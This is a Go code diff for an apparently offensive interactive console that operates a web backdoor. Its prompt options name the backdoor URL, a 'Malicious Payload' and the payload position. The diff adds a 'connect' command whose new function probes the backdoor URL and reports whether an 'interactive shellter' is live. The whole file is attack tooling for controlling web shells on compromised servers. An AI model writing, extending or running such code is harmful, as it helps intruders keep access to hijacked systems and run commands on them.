@@ -55,6 +55,10 @@ func executor(in string) {
 		fmt.Println("[+] Set Params : ", InParams)
 		return
 
+	case "connect":
+		doCheckFileBackdoor(Url)
+		return
+
 	}
 
 	if in == "" {
@@ -72,12 +76,30 @@ func completer(in prompt.Document) []prompt.Suggest {
 		{Text: "url", Description: "Url for your backdoor "},
 		{Text: "command", Description: "Malicious Payload "},
 		{Text: "params", Description: "Payload position "},
+		{Text: "connect", Description: "check backdoor file "},
 	}
 	return prompt.FilterHasPrefix(s, in.GetWordBeforeCursor(), true)
 }
 
 func changeLivePrefix() (string, bool) {
 	return LivePrefixState.LivePrefix, LivePrefixState.IsEnable
+}
+
+func doCheckFileBackdoor(url string) {
+	fmt.Println("[+] Checking shellter file ..")
+	resp, err := http.Get(url)
+	if err != nil {
+		panic(err)
+	}
+	defer resp.Body.Close()
+
+	// Print the HTTP response status.
+	if resp.StatusCode == 200 {
+		fmt.Println("[+] Interactive shellter found !!")
+		return
+	}
+	fmt.Println("[!] Failed. Exploit Maybe no use")
+	return
 }
 
 func doRequest(url string) {
